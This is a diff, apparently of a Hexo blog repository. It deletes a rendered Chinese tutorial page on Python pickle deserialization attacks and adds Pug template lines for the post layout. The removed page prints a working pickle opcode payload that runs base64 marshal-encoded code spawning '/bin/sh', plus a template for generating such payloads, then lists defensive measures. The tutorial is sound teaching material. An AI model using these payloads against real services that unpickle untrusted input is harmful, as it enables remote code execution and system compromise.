-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C2.png" alt="此处输入图片的描述"></p>
-<p>好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <code>__reduce__</code> 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个 PVM 操作码来自己构造了</p>
-<p>我们先写出来我们需要执行的东西，实际上这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数，这一部分的内容可以看<a href="https://docs.python.org/3/library/types.html" target="_blank" rel="noopener">官方文档</a>的介绍</p>
-<p>结合我们之前的编码操作，我们最重要执行的是</p>
-<pre><code>(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), &apos;&apos;))()
-</code></pre><p>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行(其实还是蛮复杂的)</p>
-<p><strong>这里直接给出 payload</strong> </p>
-<pre><code>ctypes
-FunctionType
-(cmarshal
-loads
-(cbase64
-b64decode
-(S&apos;YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMHAAAAcGljNC5weVIBAAAABwAAAHMGAAAAAAEMAQQBcwkAAABmaWIoMTApID1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMHAAAAcGljNC5weXQDAAAAZm9vBQAAAHMIAAAAAAEMAQ8EDwE=&apos;
-tRtRc__builtin__
-globals
-(tRS&apos;&apos;
-tR(tR.
-</code></pre><p> 大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造 payload 的模板，</p>
-<p> <strong>payload 模板</strong></p>
-<pre><code>import marshal
-import base64
-
-def foo():
-    pass # Your code here
-
-print &quot;&quot;&quot;ctypes
-FunctionType
-(cmarshal
-loads
-(cbase64
-b64decode
-(S&apos;%s&apos;
-tRtRc__builtin__
-globals
-(tRS&apos;&apos;
-tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))
-</code></pre><p><strong>结果：</strong></p>
-<p>我们看一下最终执行这段字符串的结果</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pickle%20load%20%E7%9A%84%E5%88%B0shell2.png" alt="此处输入图片的描述"></p>
-<p>不仅返回了我们 feibonaqie 数列的结果，还返回了我们的 shell </p>
-<p>上面这部分内容如果想看详细的解释，可以参考 <a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">文章一</a> 和 <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">文章二</a></p>
-<h2 id="0X06-Python-反序列化漏洞如何防御"><a href="#0X06-Python-反序列化漏洞如何防御" class="headerlink" title="0X06 Python 反序列化漏洞如何防御"></a><strong>0X06 Python 反序列化漏洞如何防御</strong></h2><p>(1) 不要再不守信任的通道中传递 pcikle 序列化对象<br>(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播<br>(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据<br>(4) 将 pickle 加载的数据列入白名单</p>
-<h2 id="0X07-参考"><a href="#0X07-参考" class="headerlink" title="0X07 参考"></a><strong>0X07 参考</strong></h2><p><a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">https://checkoway.net/musings/pickle/</a><br><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a><br><a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/</a><br><a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a><br><a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">https://xz.aliyun.com/t/2289</a><br><a href="https://blog.csdn.net/yanghuan313/article/details/65010925" target="_blank" rel="noopener">https://blog.csdn.net/yanghuan313/article/details/65010925</a><br><a href="https://www.cnblogs.com/wfzWebSecuity/p/9401677.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/9401677.html</a><br><a href="http://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/</a><br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a><br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a><br><a href="https://blog.csdn.net/sinat_29552923/article/details/70833455" target="_blank" rel="noopener">https://blog.csdn.net/sinat_29552923/article/details/70833455</a><br><a href="https://blog.nelhage.com/2011/03/exploiting-pickle/" target="_blank" rel="noopener">https://blog.nelhage.com/2011/03/exploiting-pickle/</a><br><a href="https://segmentfault.com/a/1190000013099825" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013099825</a><br><a href="https://segmentfault.com/a/1190000013214956" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013214956</a></p>
-</div><div class="tags"><a href="/tags/web安全-漏洞分析/">web安全 漏洞分析</a></div><div class="post-nav"><a class="pre" href="/2018/11/14/ThinkPHP5 的简单搭建/">ThinkPHP5 的简单搭建和使用</a><a class="next" href="/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/">一篇文章带你理解漏洞之 SSTI 漏洞</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
+    .post-content
+      != page.content
+    if theme.shareto == true
+      script(type='text/javascript', src=url_for(theme.js) + '/share.js' + '?v=' + theme.version, async)
+      a.article-share-link(data-url='#{page.permalink}', data-id='#{page._id}')= __('shareto')
+    include _partial/tag
+    include _partial/post_nav
+    if theme.duoshuo
+      div(class='ds-share flat' data-thread-key=page.path, data-title=page.title, data-url=page.permalink)
+         .ds-share-inline
+            ul.ds-share-icons-16
+              li(data-toggle='ds-share-icons-more')
+                a(class='ds-more' href='javascript:void(0);') 分享到：
+              li
+                a(class='ds-weibo' href='javascript:void(0);' data-service='weibo') 微博
+              li
+                a(class='ds-qzone' href='javascript:void(0);' data-service='qzone') QQ空间
+              li
+                a(class='ds-qqt' href='javascript:void(0);' data-service='qqt') 腾讯微博
+              li
+                a(class='ds-wechat' href='javascript:void(0);' data-service='wechat') 微信
+            .ds-share-icons-more
+    if page.comments
+      include _partial/comments
